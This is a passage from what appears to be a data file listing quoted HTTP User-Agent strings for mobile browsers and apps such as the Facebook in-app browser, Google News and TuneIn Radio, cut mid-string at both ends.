Radio/25.2.1; iPhone14,3; iOS/16.5","Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]","Mozilla/5.0 (iPad; CPU OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4308655968)","Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; Helium Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPad6,7; iPadOS/16.4","Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-A325F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 7.1.1; SM-J250Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2145 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; moto e(7) power Build/QOMS30.288-52-23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]","Mozilla/5.0 (Linux; Android 13; SM-F721B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; CPH2339) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A325F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; CPH2247 Build/RKQ1.201105.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; 13; CPH2375) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 12; CPH2339 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 9; ASUS_X01AD Build/WW_Phone-202011271133) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; M2101K6G Build/TKQ1.221013.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 8.1.0; I4312 Build/54.0.A.6.46; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; M2101K7BNY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; SHT-AL09 Build/HUAWEISHT-AL09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 10; SM-G965F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; 12; VONTAR H1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone12,1; iOS/16.3","Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; moto g(8) power lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 EdgA/111.0.1661.59","Mozilla/5.0 (Linux; Android 8.0.0; WAS-TL10 Build/HUAWEIWAS-TL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; M2007J22G Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 9; T12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A325F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; 2107113SG Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 11; SM-A805F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (iPad; CPU OS 15_7_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.43.304","Mozilla/5.0 (Linux; Android 12; M2101K7BL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36","TuneIn Radio/25.2.1; iPhone14,7; iOS/16.4.1","Mozilla/5.0 (Linux; Android 13; LE2123 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 10; CPH1931 Build/QKQ1.200209.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]","OrangeRadio/3.4.5 CFNetwork/1335.0.3.1 Darwin/21.6.0","Mozilla/5.0 (Linux; Android 9; HMA-L29 Build/HUAWEIHMA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; SM-N975F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; Mi A2 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-A546B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]","Mozilla/5.0 (Linux; Android 10; SM-A307FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 12; CPH2269 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 12; CPH2371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-J600FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 GNews Android/2022089220","Mozilla/5.0 (Linux; Android 7.1.1; SM-T555 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 11; 2201117SY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; A100 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ2A.230305.008.A1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.72.304","Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-G985F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; M2011K2G Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 9; H3113 Build/50.2.A.3.22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]","AppleCoreMedia/1.0.0.20E252 (iPhone; U; CPU OS 16_4_1 like Mac OS X; fr_fr)","Mozilla/5.0 (Linux; Android 10; SM-A605FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.0; iPad13,1; iPadOS/16.3.1","Mozilla/5.0 (Linux; Android 10; SNE-LX1 Build/HUAWEISNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; 22031116BG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-S906B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; Pixel 6 Build/TQ2A.230305.008.F1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A136B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; SHT-W09 Build/HUAWEISHT-W09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; CPH2271 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 10; BKL-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; LM-X120 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.47 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A325F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPhone14,2; iOS/16.4.1","Mozilla/5.0 (Linux; Android 10; ONEPLUS A5000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; LG-M250 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]","Mozilla/5.0 (Linux; Android 9; ZTE Blade A5 2020 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36 GNews Android/2022108570","Mozilla/5.0 (Linux; Android 9.0; K101_PRO Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 10; moto e(7) power Build/QOMS30.288-52-23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; AMN-LX9 Build/HUAWEIAMN-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 12; Mi 10 Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; U; Android 12; en-us; motorola one 5G UW ace Build/JOP24G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-P613 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 UCURSOS/v1.6_285-android","Mozilla/5.0 (Linux; Android 9; Mi MIX 2 Build/PKQ1.190118.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 12; CPH2305 Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; M2003J15SC Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (iPad; CPU OS 15_7_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.72.304","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Config/90.2.1301.2","Mozilla/5.0 (Linux; 12.0; QUAD-CORE T3 k2001-nwd) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; arm_64; Android 8.0.0; RNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaApp_Android/23.32.1 YaSearchBrowser/23.32.1 BroPP/1.0 SA/3 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; ASUS_X01BDA Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-A225F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-G986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; 6156D Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; W-K560-EEA Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 10; M2002J9G Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-G988B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 13; CPH2207 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-M526BR Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Dalvik/2.1.0 (Linux; U; Android 13; 22041219PG Build/TP1A.220624.014)","Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; U; Android 11; it-it; Redmi Note 11S Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.14.1-gn","Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4429283840)","Mozilla/5.0 (Linux; Android 13; NE2213 Build/SKQ1.220617.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/uk_UA;FBOP/5]","Mozilla/5.0 (Linux; Android 11; CPH1917 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH2067 Build/RKQ1.200903.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; M2007J17G Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 GNews Android/2022116172","Mozilla/5.0 (Linux; Android 7.0; SM-T815 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.45.1000","Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.24 Mobile Safari/537.36 GNews Android/2022120648","myTuneriOS%20Free/130 CFNetwork/1390 Darwin/22.0.0","Mozilla/5.0 (Linux; Android 8.1.0; DRA-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","TuneIn Radio/25.2.1; iPhone14,3; iOS/16.1.2","Mozilla/5.0 (Linux; Android 10; Redmi Note 8T 